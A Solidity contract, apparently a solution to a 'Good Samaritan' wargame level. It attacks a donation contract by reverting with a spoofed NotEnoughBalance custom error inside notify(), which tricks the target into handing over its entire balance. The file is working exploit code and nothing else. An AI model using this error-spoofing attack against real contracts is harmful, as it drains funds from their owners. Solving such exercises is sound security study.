// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IDonationRequester {
    function requestDonation() external returns (bool enoughBalance);
}

contract GoodSamaritanAttack {
    IDonationRequester public donationRequester;

    constructor(address _address) {
        donationRequester = IDonationRequester(_address);
    }
    error NotEnoughBalance();



    function notify(uint256 amount) pure external  {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function attack() external {
        bool  suc = donationRequester.requestDonation();
        require(!suc, "failed");
    }
}